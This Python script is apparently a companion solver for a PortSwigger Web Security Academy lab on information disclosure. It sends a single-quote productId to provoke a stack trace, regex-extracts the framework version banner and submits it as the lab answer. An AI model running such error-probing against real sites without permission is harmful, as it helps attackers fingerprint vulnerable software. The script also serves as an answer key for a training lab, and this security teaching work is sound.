#!/usr/bin/env python3
"""
Information disclosure in error messages
PortSwigger Web Security Academy -- Information Disclosure

Companion script for the writeup: 01-error-messages.md

What this does:
    Sends a single quote in place of the numeric productId to force a type-confusion
    exception, then parses the resulting stack trace for a framework/version string.
    The version pattern is matched with findall and the LAST match is used, since
    stack traces are full of package-name noise (e.g. java.lang.NumberFormatException)
    and the real framework/version banner sits at the bottom, closest to the root cause.

Usage:
    python 01-error-messages.py <lab-url>
    e.g. python 01-error-messages.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
import httpx

VERSION_PATTERN = re.compile(
    r"(Apache(?:\s+Struts\s*\d*)?|Nginx|PHP|Python|Django|Flask|Spring(?:\s+Boot)?|"
    r"Express|Rails|Laravel|Tomcat|IIS|Node\.js|Ruby|MySQL|PostgreSQL|Oracle|SQLite|"
    r"Microsoft-IIS|lighttpd|OpenSSL|Hibernate|Jetty|Undertow)[/\s]+([\d]+(?:\.[\d]+)+)",
    re.IGNORECASE,
)


def solve(lab_url: str) -> None:
    client = httpx.Client(verify=False, timeout=15, follow_redirects=True)

    r = client.get(f"{lab_url}/product", params={"productId": "'"})
    matches = VERSION_PATTERN.findall(r.text)
    if not matches:
        print("[-] No version string found in error response")
        print(f"    Status: {r.status_code}, Length: {len(r.text)}")
        print(f"    Tail: {r.text[-200:]}")
        return

    # Each match is a (name, version) tuple; the last one is the real banner,
    # not a package name that happens to look like one.
    name, ver_num = matches[-1]
    version_string = f"{name} {ver_num}"
    print(f"[+] FOUND version: {version_string}")

    sr = client.post(f"{lab_url}/submitSolution", data={"answer": version_string})
    if "Congratulations" in sr.text or '"correct":true' in sr.text:
        print("[+] Lab solved!")
    else:
        print(f"[!] Submit response: {sr.status_code}")
        print(f"    Response snippet: {sr.text[:300]}")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
